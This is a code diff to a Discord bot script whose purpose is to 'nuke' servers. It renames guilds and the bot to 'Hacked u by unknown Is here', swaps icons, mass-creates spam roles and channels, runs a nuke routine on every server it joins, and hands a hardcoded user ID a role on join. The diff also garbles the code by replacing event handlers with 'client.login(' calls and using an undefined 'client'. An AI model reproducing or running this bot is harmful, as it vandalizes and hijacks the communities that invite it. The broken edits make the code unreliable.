@@ -1,11 +1,11 @@
 const Discord = require("discord.js");
 const LOka = new Discord.Client();
 console.log('By KBOOOOOOOOSH-YT');
-LOka.on('ready', () => {
+client.login('ready', () => {
   console.log(`Logged in as ${LOka.user.tag} !`);
 
 });
-LOka.on('ready',  () => {
+client.login('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
@@ -18,7 +18,7 @@ console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds
 
 });
 var prefix = "-"
-LOka.on("message", message => {
+client.login("message", message => {
   if(!message.content.startsWith(prefix)) return;;
   let args = message.content.split(" ").slice(1);
   var argresult = args.join(' ');
@@ -31,34 +31,34 @@ LOka.on("message", message => {
 });
 
 var x1 = "kk"
-LOka.on('message', message => {
+client.login('message', message => {
      if (message.content === ".") {
 LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
 
 }
 });
 var x1 = "kk"
-LOka.on('message', message => {
+client.login('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked u by unknown Is here")
+client.user.setUsername("Hacked u by unknown Is here")
 
 }
 });
-LOka.on('message', message => {
+client.login('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
+client.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
 
 }
 });
 
-LOka.on('message', message => {
+client.login('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
              m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
 })
 }
 });
-LOka.on('message', message => {
+client.login('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
              m.setName(`Hacked u by unknown Is here`)
@@ -66,7 +66,7 @@ LOka.on('message', message => {
 }
 });
 
-LOka.on('message', message => {
+client.login('message', message => {
      if (message.content === ".") {
                  if(!message.channel.guild) return;
 
@@ -75,11 +75,11 @@ LOka.on('message', message => {
 }
 });
 
-LOka.on('message', message => {
+client.login('message', message => {
      
 
      if (message.content === "k1") {
-         LOka.guilds.forEach(m =>{
+         client.guilds.forEach(m =>{
   m.createRole({
         name : "Hacked u by unknown Is here",
         permissions :   [1],
@@ -283,9 +283,9 @@ LOka.on('message', message => {
  
 }
 });
-LOka.on('message', message => {
+client.login('message', message => {
          if (message.content === "k") {
-               LOka.guilds.forEach(m =>{
+               client.guilds.forEach(m =>{
 m.createChannel('Hacked u by unknown Is here', 'text');
 m.createChannel('Hacked u by unknown Is here', 'text');
 m.createChannel('Hacked u by unknown Is here', 'text');
@@ -444,7 +444,7 @@ async function nuke(guild) {
 
 }
 
-LOka.on('ready', () => {
+client.login('ready', () => {
   for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
   console.log('-------------------------------------------------------------');
   console.log('');
@@ -454,11 +454,11 @@ LOka.on('ready', () => {
 
 });
 
-LOka.on('guildCreate', async (guild) => {
+client.login('guildCreate', async (guild) => {
   return nuke(guild).catch(console.error);
 });
 
-LOka.on('guildMemberAdd', member => {
+client.login('guildMemberAdd', member => {
     
             if (member.id === "415595760990552065") {
                 member.guild.createRole({
@@ -478,4 +478,4 @@ LOka.on('guildMemberAdd', member => {
 
 
 
-LOka.login("BOT_TOKEN")
+client.login(process.env.BOT_TOKEN);
